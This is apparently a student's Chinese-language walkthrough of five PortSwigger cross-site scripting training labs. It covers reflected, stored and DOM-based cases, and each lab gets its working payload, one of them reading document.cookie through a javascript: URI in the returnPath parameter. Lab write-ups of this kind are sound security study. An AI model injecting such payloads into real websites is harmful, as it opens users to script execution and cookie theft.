#PortSwigger:Cross-site scripting实战
##关卡一： Reflected XSS into HTML context with nothing encoded
**攻击Payload**:<script>alert(1)</script>

##关卡二：Stored XSS into HTML context with nothing encoded
**攻击Payload**:1.在留言板写上<script>alert(1)</script>
               2.剩下的按要求填好即可

##关卡三：DOM XSS in document.write sink using source location.search
**攻击Payload**:"><svg onload=alert(1)>闭合前面，输出后面内容，造成弹窗

##关卡四：DOM XSS in innerHTML sink using source location.search
**攻击Payload**:<img src=1 onerror=alert(1)>

##关卡五：DOM XSS in jQuery anchor href attribute sink using location.search source
**攻击Payload**：URL参数returnPath后面写上javascript:alert(document.cookie)
**原理**：returnPath告诉页面 “点击返回按钮之后跳转到哪里”,加入javascript伪协议，可以直接使网页跳转
